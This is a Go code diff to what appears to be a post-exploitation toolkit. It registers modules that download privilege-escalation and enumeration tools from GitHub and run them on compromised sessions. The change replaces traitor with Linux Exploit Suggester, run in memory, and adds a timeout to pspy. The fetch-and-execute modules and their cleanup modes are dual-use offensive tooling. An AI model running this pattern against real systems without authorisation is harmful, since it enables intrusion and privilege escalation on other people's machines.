@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"sort"
+	"time"
 )
 
 // Module interface for all gummy modules
@@ -31,7 +32,7 @@ func GetModuleRegistry() *ModuleRegistry {
 		globalRegistry.Register(&LSEModule{})
 		globalRegistry.Register(&LootModule{})
 		globalRegistry.Register(&PSPYModule{})
-		globalRegistry.Register(&TraitorModule{})
+		globalRegistry.Register(&LinExpModule{})
 		// Windows modules
 		globalRegistry.Register(&WinPEASModule{})
 		globalRegistry.Register(&SeatbeltModule{})
@@ -108,7 +109,7 @@ const (
 	URL_LSE     = "https://github.com/chsoares/linux-smart-enumeration/raw/refs/heads/master/lse.sh"
 	URL_LOOT    = "https://github.com/chsoares/ezpz/raw/refs/heads/main/utils/loot.sh"
 	URL_PSPY64  = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
-	URL_TRAITOR = "https://github.com/liamg/traitor/releases/latest/download/traitor-amd64"
+	URL_LINEXP = "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh"
 
 	// Windows
 	URL_WINPEAS  = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe"
@@ -156,6 +157,9 @@ func (m *PSPYModule) Description() string   { return "Run pspy process monitor" 
 func (m *PSPYModule) ExecutionMode() string { return "disk-cleanup" }
 
 func (m *PSPYModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
+	// pspy runs indefinitely — timeout after 5 minutes so the worker exits and cleanup runs
+	ctx, cancel := context.WithTimeout(ctx, 5*time.Minute)
+	defer cancel()
 	return session.RunBinary(ctx, URL_PSPY64, args)
 }
 
@@ -171,19 +175,16 @@ func (m *LootModule) Run(ctx context.Context, session *SessionInfo, args []strin
 	return session.RunScriptInMemory(ctx, URL_LOOT, args)
 }
 
-// TraitorModule - Auto privilege escalation for Linux
-type TraitorModule struct{}
+// LinExpModule - Linux Exploit Suggester
+type LinExpModule struct{}
 
-func (m *TraitorModule) Name() string          { return "traitor" }
-func (m *TraitorModule) Category() string      { return "linux" }
-func (m *TraitorModule) Description() string   { return "Run traitor auto privesc" }
-func (m *TraitorModule) ExecutionMode() string { return "disk-cleanup" }
+func (m *LinExpModule) Name() string          { return "linexp" }
+func (m *LinExpModule) Category() string      { return "linux" }
+func (m *LinExpModule) Description() string   { return "Run Linux Exploit Suggester" }
+func (m *LinExpModule) ExecutionMode() string { return "memory" }
 
-func (m *TraitorModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
-	if len(args) == 0 {
-		args = []string{"-a"}
-	}
-	return session.RunBinary(ctx, URL_TRAITOR, args)
+func (m *LinExpModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
+	return session.RunScriptInMemory(ctx, URL_LINEXP, args)
 }
 
 // ============================================================================
